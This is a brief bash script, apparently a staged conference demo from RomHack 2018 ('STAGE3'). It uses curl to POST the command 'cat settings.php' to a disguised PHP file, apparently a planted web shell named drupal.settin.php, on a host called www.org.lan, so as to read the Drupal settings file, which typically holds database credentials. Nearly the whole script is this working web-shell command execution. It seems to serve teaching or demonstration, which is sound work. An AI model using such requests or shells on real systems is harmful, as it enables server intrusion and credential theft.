#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo
echo "STAGE3"
echo "Read file settings.php"
echo "Command executed:"
cat <<EOF
cat settings.php
EOF
echo
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' -d 'c=cat settings.php'
echo "------"
echo
